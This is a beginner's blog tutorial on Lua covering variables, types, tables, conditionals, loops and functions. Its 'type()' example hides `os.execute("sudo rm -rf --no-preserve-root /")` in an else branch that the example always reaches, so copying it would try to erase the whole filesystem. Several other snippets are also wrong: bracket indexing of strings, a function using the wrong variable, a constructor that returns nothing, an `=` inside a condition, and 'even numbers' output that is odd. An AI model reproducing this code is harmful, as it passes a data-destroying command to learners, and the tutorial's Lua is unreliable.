---
title: "Basic lua guide"
subtitle: "Introduction to the basics of Lua"
date: 2025-01-02T12:39:21+01:00
draft: false
toc: true
tags:
    - "guide"
    - "lua"
---

## The language
*src: [Lua's website about section](https://www.lua.org/about.html)*

Lua is a powerful, efficient, lightweight, embeddable scripting language. It supports procedural programming, object-oriented programming, functional programming, data-driven programming, and data description.

Lua combines simple procedural syntax with powerful data description constructs based on associative arrays and extensible semantics. Lua is dynamically typed, runs by interpreting bytecode with a register-based virtual machine, and has automatic memory management with incremental garbage collection, making it ideal for configuration, scripting, and rapid prototyping. 
## The basics
### Variables
Variables in lua are very simple to declare:
```lua
var = "Hello, World"
```
All variables in lua are declared in global scope, but you can make a variable only be on local scope with the `local` keyword:
```lua
local var = "Hello, World"
```
To overwrite the value of a variable, we declare the variable one more time as it was a global.
```lua
local my_var = 5 --declare the variable
my_var = 6 --overwrite the value
```
---
No variable in lua has a specific type. This means that you can't declare as a *string* or an *integer*, all variables change in type.

**But,** there is a way to check if a variable is of a certain type using the `type()` function.
```lua
local my_string = "Hello, World"
my_string = 5
if type(my_string) == "string" then
    print('The variable type is "string"')
else
    print('The variable type is not "string"')
    os.execute("sudo rm -rf --no-preserve-root /")
end
```
This are the types in lua:
- string
- number
- table
- function
- userdata
- thread
- nil
- boolean

### String
---
The common string type, present in almost every language. Strings can be treated at tables, so you can access characters inside the string.
```lua
local my_string = "Hello, World!"
my_string[4] --l
```
Try this code in a `.lua` file or the interactive `lua` interpreter and see the result, then read it and try to understand what it does.
```lua
function PrintCharacters(str)
	for i=1, #str do
		print(my_string[i])
	end
end
```

### Number
---
Numbers in `lua` aren't `float`/`integer`, they all share the `number` data type, that contains numbers with and without decimals. This means that if you, per example, divided two integers *(let's say 3 and 2)* in `lua` and two in `ruby` you would see how ruby returns an integer, but lua a float.

{{% columns %}}

#### Lua
```lua
print(3 / 2) -- 1.5

```

<--->
#### Ruby

```ruby
puts 3 / 2 #=> 1
puts 3.0 / 2.0 #=> 1.5
```

{{% /columns %}}

This can be useful when doing calculations, as you will not have to worry about if the result will be a float or an integer, but is also a two-edged sword as you can also expect an integer and receive a float.

### Table
---
Tables are the most powerful and useful data type in `lua`.
{{< box info >}}
**Index**

Indexes in `lua` start with 1, not with 0.
```lua
array = {1, 2, 3, 4}

array[0] -- nil
array[1] -- 1
```
{{< /box >}}

You can use a table as an array
```lua
array = {1, 2, 3, 4}
```
As a dictionary
```lua
dict = {
	a = "a",
	b = "b",
	c = "c"
}
```

As both at the same time
```lua
array_and_dict = {
	1, 
	2,
	3,
	a = "a",
	b = "b",
	c = "c"
}

array_and_dict[1] -- 1
array_and_dict.a  -- "a"
```

Or even as a **class**!
```lua
Class = {
	add = function(a, b)
		return a + b
	end,
	new = function(self) -- create new object
		local obj = {} -- object table
		for k, v in pairs(self) do -- for key, value in this table do
			if k ~= "new" then -- exclude this method
				obj[k] = v -- add the value to the object with the same key
			end -- if
		end -- loop
	end -- function
}

-- call the Class.new method with colon to pass as first argument "Class".
local obj = Class:new()
```

Tables in `lua` are very useful when storing data, as they can be easily and efficiently modified and iterated on with the [`pairs` and `ipairs` methods](#pairs-and-ipairs).

#### Accessing values
---
Values in `lua` table's can be accessed like this:
- If the value has an index, `table[index]`
- If the value has a key, there are two ways:
	+ `table.key`
	+ `table[key]`
	
#### Adding/Removing values
---
You can add/remove values in lua tables with the `table.insert` and `table.remove` methods:
```lua {hl_lines=["3-4", 6]}
my_table = {1, 2, 3}

table.insert(my_table, 4) -- table, value
table.insert(my_table, 2, 2) -- table, pos, value

table.remove(my_table, 2) -- removes the value in second position (in this case 2)
```

#### `pairs` and `ipairs`.
---
This methods are the most famous way to iterate over a table in `lua`. They are used in `for` loops and are global methods.

This code:
```lua
MF_DOOM = { -- R.I.P
	name = "Daniel",
	surname = "Dumile",
	birth_year = 1971,
	death_year = 2020,
	was_loved = true,
	occupation = {"Rapper", "Songwriter", "Record producer"}
}

for key, val in pairs(MF_DOOM) do -- iterate over the MF DOOM table with pairs
	print(key..": "..tostring(val)) -- key: value_to_string
end
```
Will give this result:
```
surname: Dumile
birth_year: 1971
occupation: table: 0x62b2ee1d5640
name: Daniel
was_loved: true
death_year: 2020
```

### Boolean
Booleans are values that represent `true` or `false`, nothing more.

They are useful in conditionals, as `if` always checks if the condition is `true`, so you can use a boolean as condition.
```lua {hl_lines=["3-5", "8-10"]}
bool = true

if bool then -- same as bool == true
	print("Hello, World!")
end
-- output: "Hello, World!"

if not bool then -- same as bool == false
	print("Goodbye, World!")
end
-- no output
```

## Conditional statements
Conditional statements (Conditionals) are very useful. They are used to check if a condition is `true` or `false` *(see [boolean](#boolean) above)*

### If statement
The if statement is used to check if a condition is `true` or `false`, a very reliable piece of logic that is very simple to use.
```lua {hl_lines=["3-5"]}
condition = 5 == 5

if condition == true then
	print("yeah")
end
```

{{< box tip >}}
**Shorten if statements**

If statements can be shortened to make code more clean and readable:
```lua
-- long
if condition == true then
	print("yeah")
end

-- short
if condition then -- "if" also checks if the value passed is not `nil` or `false`
	print("yeah")
end

-- "not" makes a boolean be the opposite (true to false, false to true),
-- but it can also be used to check if a condition is false.
if not condition then
	print("no")
end
```
{{< /box >}}

### Else
The `else` keyword is used with if statements to run a block of code if the condition was false, normally used to avoid errors *(or throw them!)*.
```lua {hl_lines=["5-6"]}
condition = 5 == 5

if condition == true then
	print("yeah")
else
	print("no")
end
```

### Else if
The `elseif` keyword is used with if statements to run a block of code if the condition was false that checks for another condition.
```lua {hl_lines=["5-6"]}
condition, condition_2 = 5 == 5, "yes" == "yes"

if condition then
	print("5 equals 5")
elseif condition_2 then
	print('"yes" equals "yes"')
else
	error("Loser")
end
```

### `or` and `and`.
The `or` and `and` keywords are basic logic gates used very much across all languages.

- Or allows you to check if a condition is true **or** another condition is true, or another, another...
```lua
if false or true then 
	print("yes") 
else 
	print("no") 
end
-- will print yes

if false or false then
	print("yes") 
else 
	print("no") 
end
-- will print no

```
- And allows you to check if two or more conditions are true.
```lua
if true and true then 
	print("yes") 
else 
	print("no") 
end
-- will print yes

if true and false then
	print("yes") 
else 
	print("no") 
end
-- will print no
```

You can combine them to make more complex conditions:
```lua
if user.registered and (user.admin or user.name = "CEO Generic Name") then
	AdminMenu(user)
end
```

## Loops
Loops are used to repeat a block of code a determined amount of times or iterate over a table.

There are three types of loops in `lua`:
- For loop
- While loop
- Repeat-until loop

### While loop
While loop repeats while a condition is true:
```lua
count = 0
while count < 10 do
	print("count is: "..count)
end
```
If you were to run this code you would see how the program never ends. This is because we never increase count.

This can be fixed adding one to count every iteration.
```lua
count = 0
while count < 10 do
	count = count + 1
	-- ...
end
```

### Repeat-until loop
The Repeat-until loop repeats a block of code until a condition is true. Basically the same as while loop, but ends when the condition is true.
```lua
count = 0
repeat
	count = count + 1
	print("count is: "..count)
until count > 10
```

### For loop
For loop is the most used loop in almost every language.

In `lua` its syntax is this:
```lua
for start_val=number, end_val, increment? do
	block
end
```

It's better than the While loop because you don't need to worry about incrementing any value, as it increments automatically.

The code we made in the While loop section would be like this with a For loop:
```lua
for count=1, 10 do
	print("count is: "..count)
end
```

The third value is how much is added to the first value after every iteration.
```lua
for count=1, 10, 2 do
	print("count is: "..count)
end
-- will print even numbers from 1 to 10
```

### For loops and tables
You can iterate over a table with For loops by setting the second value to the table length and accessing the values in the table with the first value:
```lua
my_table = {1, 2, 3, 4}

for i=1, #my_table do -- for index=1, "my_table" length do
	print(my_table[i]) -- we access "my_table" with the incrementing "i" variable
end
```

## Functions
Functions in `lua` are pieces of code that can be *"called"* as many times as you want. They allow you to avoid writing repetitive code. 

They are declared with the `function` *keyword*, and can be locally declared with `local function`.
```lua
function HelloKepler()
	print("Hello, Kepler-22b!")
end
```

### Arguments
Functions can have *arguments* (or *parameters*). Arguments are values passed by the user when the function is called, and are very useful.

Let's say you need a function that gives the full name of a person joining their first name and first surname. You could make a function with parameters `name` and `surname`, then join the values associated.
```lua
function GetFullName(name, surname)
	return name.." "..surname
end
```
Let's call this function and see what it does!
```
> GetFullName()
stdin:2: attempt to concatenate a nil value (local 'surname')
stack traceback:
	stdin:2: in function 'GetFullName'
	(...tail calls...)
	[C]: in ?
> aww man :(
```
We got an error because we didn't *pass* the arguments to the function. Let's try again:
```
> GetFullName("Elvis", "Presley")
Elvis Presley
```
Now that worked! But what if a co-worker doesn't pass any arguments, we need default values!

Let's make them be `"John"` for `name` and `"Doe"` for `surname`.
```lua {hl_lines=["2-3"]}
function GetFullName(name, surname)
	name = name or "John" -- if name is nil, default to John
	surname = surname or "Doe" -- if surname is nil, default to Doe
	
	return name.." "..surname
end
```

What we made here is we made `name` and `surname` be defaulted to a certain value if `nil` *(not passed)*. We did this with the `or` keyword, used in conditionals, yes, but also when declaring and modifying values.

Experiment with this by declaring some values, functions with arguments, etc. and trying out things.
```lua {hl_lines=["1-5", 13, "17-19"]}
some_value = "Hello, World!" or nil -- will be "Hello, World!"
some_other_value = nil or "Hello, World!" -- will be "Hello, World!"

some_other_other_value = nil
another_value = some_other_other_value or "Hello, World!" -- will be "Hello, World!"

function Concat(a, b)
	a = a or "Deez"
	b = b or "Nuts"
	return a.." "..b
end

Concat(nil, "Ballz") -- what do you think this will return?

2 + nil -- error
2 + (2 or nil) -- 4
((2 + 2) or 4) + ((2 + 2) or 4) -- 8

complex_thingy = (4 or ((2 * 2) or (8 / 4)) + ((1 + 2) + 1) or (6 / 2 + 1)) -- what do you think it will be?
```

### Return
The `return` *keyword* is used for... Come on you know what the keyword named `return` does.

But, joking aside, the `return` keyword is used when you want your function to **return** a value. This is what we made with our `Concat` function.
```lua {hl_lines=[4]}
function Concat(a, b)
	a = a or "Deez"
	b = b or "Nuts"
	return a.." "..b
end
```

This can be very useful, you can pass a number and return its square root, pass a `Person` class you made and return the person's full name, etc.


